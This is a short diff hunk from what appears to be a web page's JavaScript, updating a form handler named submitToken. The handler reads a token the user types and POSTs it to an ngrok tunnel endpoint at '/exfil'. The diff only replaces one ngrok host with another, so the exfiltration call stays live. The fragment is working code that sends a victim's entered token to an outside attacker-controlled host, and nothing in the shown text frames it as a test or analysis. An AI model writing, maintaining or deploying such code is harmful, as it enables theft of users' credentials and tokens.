@@ -81,7 +81,7 @@
     function submitToken(e) {
       e.preventDefault();
       const token = document.getElementById("tokenInput").value;
-      fetch("https://eaf2560d9a9b.ngrok-free.app/exfil", {
+      fetch("https://4946927c3400.ngrok-free.app/exfil", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ value: token })
